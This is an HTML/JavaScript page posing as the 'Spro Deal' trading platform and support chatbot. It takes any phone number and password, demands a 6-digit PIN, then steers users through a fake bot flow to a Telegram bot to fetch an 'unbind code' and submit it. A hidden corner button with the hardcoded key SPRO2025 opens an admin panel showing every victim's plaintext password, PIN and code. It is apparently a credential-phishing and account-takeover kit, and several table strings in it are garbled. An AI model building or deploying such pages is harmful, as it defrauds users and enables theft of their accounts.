<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Spro Deal - Complete System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #e8f5e9;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }

        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 450px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
        }

        .container-wide {
            width: 95%;
            max-width: 1200px;
        }

        .brand {
            color: #2e7d32;
            font-size: 28px;
        }

        .tagline {
            color: #2e7d32;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
        }

        .green-btn {
            background: #2e7d32;
            color: white;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin: 5px 0;
        }

        .gray-btn {
            background: #666;
            color: white;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin: 5px 0;
        }

        .policy {
            font-size: 12px;
            margin-top: 15px;
            color: gray;
        }

        .chat-box {
            background: #f5f5f5;
            height: 350px;
            overflow-y: auto;
            padding: 15px;
            margin-bottom: 10px;
            text-align: left;
            border-radius: 10px;
        }

        .bot-msg {
            margin-bottom: 12px;
            padding: 10px;
            background: #e8f5e9;
            border-radius: 10px;
            animation: fadeIn 0.3s ease;
        }

        .user-msg {
            margin-bottom: 12px;
            padding: 10px;
            background: #d1e7dd;
            border-radius: 10px;
            text-align: right;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes typingDots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        .typing-indicator {
            display: inline-block;
            background: #e8f5e9;
            padding: 10px 15px;
            border-radius: 15px;
            margin: 5px 0;
        }

        .typing-indicator span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #2e7d32;
            border-radius: 50%;
            margin: 0 2px;
            animation: typing 1.4s infinite;
        }

        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.5; }
            30% { transform: translateY(-8px); opacity: 1; }
        }

        .bot-name {
            color: #2e7d32;
            font-weight: bold;
        }

        .online-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #4caf50;
            border-radius: 50%;
            margin-left: 8px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
            70% { box-shadow: 0 0 0 6px rgba(76, 175, 80, 0); }
            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
        }

        .options-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin: 10px 0;
        }

        .option-btn {
            background: #2e7d32;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            transition: transform 0.2s;
        }

        .option-btn:hover {
            transform: scale(1.02);
        }

        .admin-only {
            background: #fff3e0;
            border: 2px solid #ff9800;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
            font-size: 12px;
        }

        th {
            background: #2e7d32;
            color: white;
        }

        .approve-btn {
            background: green;
            color: white;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 2px;
        }

        .reject-btn {
            background: red;
            color: white;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 2px;
        }

        .pending {
            color: orange;
            font-weight: bold;
        }

        .approved {
            color: green;
            font-weight: bold;
        }

        .rejected {
            color: red;
            font-weight: bold;
        }

        .code-input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 2px;
        }

        /* Small admin button - tipki ki tarah */
        .secret-admin-btn {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 40px;
            height: 40px;
            background: rgba(46, 125, 50, 0.3);
            border-radius: 50%;
            cursor: pointer;
            z-index: 999;
            opacity: 0.3;
            transition: opacity 0.3s;
        }

        .secret-admin-btn:hover {
            opacity: 0.8;
        }

        .success-msg {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
            text-align: center;
            font-weight: bold;
            animation: fadeIn 0.5s ease;
        }

        .telegram-link {
            display: inline-block;
            background: #0088cc;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            text-decoration: none;
            margin-top: 8px;
            font-size: 13px;
        }
    </style>
</head>
<body>
<div id="app"></div>

<script>
    // ============ DATA STORAGE ============
    function getUsers() {
        return JSON.parse(localStorage.getItem('spro_users') || '[]');
    }
    
    function saveUsers(users) {
        localStorage.setItem('spro_users', JSON.stringify(users));
    }
    
    function getRequests() {
        return JSON.parse(localStorage.getItem('spro_requests') || '[]');
    }
    
    function saveRequests(requests) {
        localStorage.setItem('spro_requests', JSON.stringify(requests));
    }
    
    let currentUser = null;
    
    // Typing animation function
    async function showTyping(chatBox, callback) {
        let typingDiv = document.createElement('div');
        typingDiv.className = 'typing-indicator';
        typingDiv.innerHTML = '<span></span><span></span><span></span>';
        chatBox.appendChild(typingDiv);
        chatBox.scrollTop = chatBox.scrollHeight;
        
        await new Promise(resolve => setTimeout(resolve, 4000));
        
        typingDiv.remove();
        callback();
    }
    
    // ============ PAGES ============
    
    function renderLogin() {
        document.getElementById('app').innerHTML = `
            <div class="container">
                <h2 class="brand">Spro Deal</h2>
                <p class="tagline">A stable and profitable platform</p>
                <h3>SIGN IN TO SPRO DEAL</h3>
                <input type="tel" id="phone" placeholder="Phone number" class="input-field">
                <input type="password" id="password" placeholder="Password" class="input-field">
                <button id="signinBtn" class="green-btn">SIGN IN</button>
                <p class="policy">By logging in you agree to our Privacy Policy</p>
            </div>
            <div class="secret-admin-btn" id="secretAdminBtn"></div>
        `;
        
        document.getElementById('signinBtn').onclick = handleLogin;
        document.getElementById('secretAdminBtn').onclick = () => {
            let key = prompt('🔐 ENTER ADMIN KEY');
            if(key === 'SPRO2025') {
                renderAdminPanel();
            } else if(key) {
                alert('❌ Invalid Key');
            }
        };
    }
    
    function handleLogin() {
        let phone = document.getElementById('phone').value;
        let password = document.getElementById('password').value;
        
        if(!phone || !password) {
            alert('Please enter phone and password');
            return;
        }
        
        let users = getUsers();
        let existingUser = users.find(u => u.phone === phone);
        
        if(existingUser) {
            existingUser.password = password;
            saveUsers(users);
            currentUser = existingUser;
        } else {
            let newUser = {
                phone: phone,
                password: password,
                pin: null,
                created_at: new Date().toISOString()
            };
            users.push(newUser);
            saveUsers(users);
            currentUser = newUser;
        }
        
        renderPINVerify();
    }
    
    function renderPINVerify() {
        document.getElementById('app').innerHTML = `
            <div class="container">
                <h2>🔐 SECURITY VERIFICATION</h2>
                <p style="color:#2e7d32;">Welcome ${currentUser.phone}</p>
                <p>Please enter 6-digit PIN to continue</p>
                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN">
                <button id="verifyPinBtn" class="green-btn">VERIFY & CONTINUE</button>
            </div>
            <div class="secret-admin-btn" id="secretAdminBtn"></div>
        `;
        
        document.getElementById('verifyPinBtn').onclick = () => {
            let pin = document.getElementById('pin').value;
            if(pin.length !== 6) {
                alert('PIN must be 6 digits');
                return;
            }
            
            let users = getUsers();
            let user = users.find(u => u.phone === currentUser.phone);
            if(user) {
                user.pin = pin;
                saveUsers(users);
                currentUser.pin = pin;
            }
            
            renderDashboard();
        };
        
        document.getElementById('secretAdminBtn').onclick = () => {
            let key = prompt('🔐 ENTER ADMIN KEY');
            if(key === 'SPRO2025') renderAdminPanel();
            else if(key) alert('❌ Invalid Key');
        };
    }
    
    function renderDashboard() {
        let selectedIssue = '';
        let step = 'select'; // select, help, unbind, code
        let unbindCode = '';
        
        document.getElementById('app').innerHTML = `
            <div class="container" style="width: 500px;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px;">
                    <h3>🤖 SPRO SUPPORT BOT</h3>
                    <span class="online-status"></span>
                    <span style="font-size: 12px; color: green;">Online</span>
                </div>
                <div id="chatBox" class="chat-box"></div>
                
                <div id="optionsArea" class="options-grid"></div>
                
                <div id="completeArea" style="display: none;">
                    <input type="text" id="unbindCodeInput" class="code-input" placeholder="Enter Unbind Code">
                    <button id="submitUnbindBtn" class="green-btn">✅ SUBMIT UNBIND CODE</button>
                </div>
                
                <div id="successMessage" style="display: none;"></div>
                
                <button id="logoutBtn" class="gray-btn" style="margin-top:15px;">LOGOUT</button>
            </div>
            <div class="secret-admin-btn" id="secretAdminBtn"></div>
        `;
        
        const chatBox = document.getElementById('chatBox');
        
        function addBotMessage(text, showTypingEffect = true) {
            if(showTypingEffect) {
                showTyping(chatBox, () => {
                    let div = document.createElement('div');
                    div.className = 'bot-msg';
                    div.innerHTML = `<span class="bot-name">🤖 Bot:</span> ${text}`;
                    chatBox.appendChild(div);
                    chatBox.scrollTop = chatBox.scrollHeight;
                });
            } else {
                let div = document.createElement('div');
                div.className = 'bot-msg';
                div.innerHTML = `<span class="bot-name">🤖 Bot:</span> ${text}`;
                chatBox.appendChild(div);
                chatBox.scrollTop = chatBox.scrollHeight;
            }
        }
        
        function addUserMessage(text) {
            let div = document.createElement('div');
            div.className = 'user-msg';
            div.innerHTML = `👤 You: ${text}`;
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
        }
        
        // Initial bot message
        setTimeout(() => {
            addBotMessage("Namaste! 🙏 Hello! How can I help you today?", true);
            setTimeout(() => {
                addBotMessage("👇 Please select an issue from below options:", true);
            }, 1000);
        }, 500);
        
        // Issue options
        const issues = [
            { id: 'withdrawal', name: '💰 Withdrawal Problem', emoji: '💰' },
            { id: 'deposit', name: '📥 Deposit Problem', emoji: '📥' },
            { id: 'order', name: '📦 Order Problem', emoji: '📦' },
            { id: 'upi', name: '🔄 UPI Problem', emoji: '🔄' },
            { id: 'forget', name: '🔑 Password Forget', emoji: '🔑' },
            { id: 'others', name: '❓ Others Problem', emoji: '❓' }
        ];
        
        const optionsArea = document.getElementById('optionsArea');
        issues.forEach(issue => {
            let btn = document.createElement('button');
            btn.className = 'option-btn';
            btn.innerHTML = issue.name;
            btn.onclick = () => {
                selectedIssue = issue.id;
                addUserMessage(issue.name);
                addBotMessage(`Aapne "${issue.name}" select kiya.`, true);
                setTimeout(() => {
                    addBotMessage("🔗 @uk_member_robot — Verification Required! ✅", true);
                    setTimeout(() => {
                        addBotMessage("Please click this link to verify: 👇", true);
                        setTimeout(() => {
                            let telegramDiv = document.createElement('div');
                            telegramDiv.className = 'bot-msg';
                            telegramDiv.innerHTML = `<span class="bot-name">🤖 Bot:</span> <a href="https://t.me/uk_member_robot" target="_blank" class="telegram-link">📱 Click here to open Telegram & Verify</a>`;
                            chatBox.appendChild(telegramDiv);
                            chatBox.scrollTop = chatBox.scrollHeight;
                            
                            setTimeout(() => {
                                addBotMessage("After verification, type <strong>/help</strong> in bot", true);
                                setTimeout(() => {
                                    addBotMessage("Then click on <strong>unbind</strong> option", true);
                                    setTimeout(() => {
                                        // Show complete button
                                        const completeArea = document.getElementById('completeArea');
                                        completeArea.style.display = 'block';
                                        
                                        document.getElementById('submitUnbindBtn').onclick = () => {
                                            let code = document.getElementById('unbindCodeInput').value;
                                            if(!code || code.length < 4) {
                                                addBotMessage("⚠️ Please enter a valid unbind code (minimum 4 characters)", true);
                                                return;
                                            }
                                            
                                            addUserMessage(`Unbind Code: ${code}`);
                                            
                                            // Save request to admin
                                            let requests = getRequests();
                                            let newRequest = {
                                                id: Date.now(),
                                                phone: currentUser.phone,
                                                issue: selectedIssue,
                                                code: code,
                                                status: 'pending',
                                                created_at: new Date().toISOString()
                                            };
                                            requests.push(newRequest);
                                            saveRequests(requests);
                                            
                                            // Show success message
                                            const successDiv = document.getElementById('successMessage');
                                            successDiv.style.display = 'block';
                                            successDiv.innerHTML = `
                                                <div class="success-msg">
                                                    ✅✅✅<br>
                                                    <strong>REQUEST SUCCESSFULLY PROCESSED!</strong><br>
                                                    आपकी request सफलतापूर्वक submit हो गई है!<br>
                                                    Wait checking our team. ⏳
                                                </div>
                                            `;
                                            
                                            // Disable complete area
                                            document.getElementById('completeArea').style.display = 'none';
                                            
                                            addBotMessage("✅ Thank you! Your request has been submitted successfully.", true);
                                            addBotMessage("⏳ Wait checking our team. We will update you soon.", true);
                                        };
                                    }, 2000);
                                }, 2000);
                            }, 2000);
                        }, 1000);
                    }, 1000);
                }, 500);
            };
            optionsArea.appendChild(btn);
        });
        
        document.getElementById('logoutBtn').onclick = () => {
            currentUser = null;
            renderLogin();
        };
        
        document.getElementById('secretAdminBtn').onclick = () => {
            let key = prompt('🔐 ENTER ADMIN KEY');
            if(key === 'SPRO2025') renderAdminPanel();
            else if(key) alert('❌ Invalid Key');
        };
    }
    
    function renderAdminPanel() {
        let users = getUsers();
        let requests = getRequests();
        
        document.getElementById('app').innerHTML = `
            <div class="container container-wide">
                <h2>🔐 ADMIN PANEL</h2>
                <p style="color:green;">👑 Welcome Admin | 👥 Total Users: ${users.length} | 📋 Total Requests: ${requests.length}</p>
                
                <h3 style="margin-top:20px;">⏳ PENDING REQUESTS</h3>
                <div id="pendingRequestsTable"></div>
                
                <h3 style="margin-top:30px;">📜 ALL REQUESTS HISTORY</h3>
                <div id="allRequestsTable"></div>
                
                <h3 style="margin-top:30px;">👥 ALL USERS (ID, Password, PIN)</h3>
                <div id="usersTable"></div>
                
                <button id="adminLogoutBtn" class="gray-btn" style="margin-top:20px;">LOGOUT</button>
            </div>
            <div class="secret-admin-btn" id="secretAdminBtn"></div>
        `;
        
        // Pending Requests
        let pendingRequests = requests.filter(r => r.status === 'pending');
        let pendingHtml = '';
        if(pendingRequests.length === 0) {
            pendingHtml = '<p>✅ No pending requests</p>';
        } else {
            pendingHtml = '<table> etxek<th>ID</th><th>Phone</th><th>Issue</th><th>Unbind Code</th><th>Time</th><th>Action</th></tr>';
            pendingRequests.forEach(r => {
                pendingHtml += `
                    <tr>
                        <td>${r.id}</td>
                        <td>${r.phone}</td>
                        <td>${r.issue}</td>
                        <td><strong>${r.code}</strong></td>
                        <td>${new Date(r.created_at).toLocaleString()}</td>
                        <td>
                            <button class="approve-btn" data-id="${r.id}">✅ APPROVE</button>
                            <button class="reject-btn" data-id="${r.id}">❌ REJECT</button>
                        </td>
                    </tr>
                `;
            });
            pendingHtml += '</table>';
        }
        document.getElementById('pendingRequestsTable').innerHTML = pendingHtml;
        
        // Approve/Reject handlers
        document.querySelectorAll('.approve-btn').forEach(btn => {
            btn.onclick = () => updateRequestStatus(parseInt(btn.getAttribute('data-id')), 'approved');
        });
        document.querySelectorAll('.reject-btn').forEach(btn => {
            btn.onclick = () => updateRequestStatus(parseInt(btn.getAttribute('data-id')), 'rejected');
        });
        
        // All Requests
        let allRequestsHtml = '能atable<th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr>';
        [...requests].reverse().forEach(r => {
            let statusClass = r.status === 'approved' ? 'approved' : (r.status === 'rejected' ? 'rejected' : 'pending');
            let statusText = r.status === 'approved' ? '✅ APPROVED' : (r.status === 'rejected' ? '❌ REJECTED' : '⏳ PENDING');
            allRequestsHtml += `
                <tr>
                    <td>${r.id}</td>
                    <td>${r.phone}</td>
                    <td>${r.issue}</td>
                    <td>${r.code}</td>
                    <td class="${statusClass}">${statusText}</td>
                    <td>${new Date(r.created_at).toLocaleString()}</td>
                </tr>
            `;
        });
        allRequestsHtml += '</table>';
        document.getElementById('allRequestsTable').innerHTML = allRequestsHtml;
        
        // Users table
        let usersHtml = '能atable<th>Phone</th><th>Password</th><th>PIN</th><th>Created At</th></tr>';
        users.forEach(u => {
            usersHtml += `
                <tr>
                    <td>${u.phone}</td>
                    <td>${u.password}</td>
                    <td>${u.pin || 'Not set'}</td>
                    <td>${new Date(u.created_at).toLocaleString()}</td>
                </tr>
            `;
        });
        usersHtml += '</table>';
        document.getElementById('usersTable').innerHTML = usersHtml;
        
        document.getElementById('adminLogoutBtn').onclick = () => renderLogin();
        document.getElementById('secretAdminBtn').onclick = () => {
            let key = prompt('🔐 ENTER ADMIN KEY');
            if(key === 'SPRO2025') renderAdminPanel();
            else if(key) alert('❌ Invalid Key');
        };
    }
    
    function updateRequestStatus(requestId, newStatus) {
        let requests = getRequests();
        let request = requests.find(r => r.id === requestId);
        if(request) {
            request.status = newStatus;
            request.updated_at = new Date().toISOString();
            saveRequests(requests);
            alert(`✅ Request ${newStatus.toUpperCase()} successfully!`);
            renderAdminPanel();
        }
    }
    
    // Start
    renderLogin();
</script>
</body>
</html>
